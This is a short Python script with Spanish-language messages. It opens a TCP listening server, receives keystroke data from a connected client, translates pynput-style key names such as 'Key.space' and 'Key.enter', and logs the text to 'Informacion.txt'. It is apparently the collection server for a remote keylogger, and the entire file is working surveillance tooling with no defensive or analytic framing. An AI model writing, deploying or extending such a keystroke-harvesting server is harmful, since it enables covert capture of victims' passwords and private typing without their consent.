import socket
import signal
import sys

def ctrl_c(sig, frame):
    print("\n\n[!] Se ha finalizado el script\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, ctrl_c)

# Solicitar la dirección IP y el puerto al usuario
host = input("Ingrese la dirección IP para escuchar: ")

while True:
    try:
        port = int(input("Ingrese el número de puerto para escuchar: "))
        break
    except ValueError:
        print("Por favor, ingrese un número válido para el puerto.")

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    key_mapping = {
        'Key.space': 'space',
        'Key.enter': 'enter',
        'Key.tab': 'tab'
    }

    decoded_keys = [key_mapping.get(key, key) for key in keys]
    decoded_text = ''.join(decoded_keys)

    with open("Informacion.txt", "a") as file:
        file.write(decoded_text + ' ')

print(f"\n[+] Servidor en escucha desplegado en el host {host}:{port}")
conn, address = s.accept()
print("Connected to Client: " + str(address))

while True:
    data = conn.recv(1024).decode()

    if 'Key.' in data:
        data = data.split('.')[1]

    file_write([data])

    if not data:
        break
    print(str(data))

conn.close()
s.close()
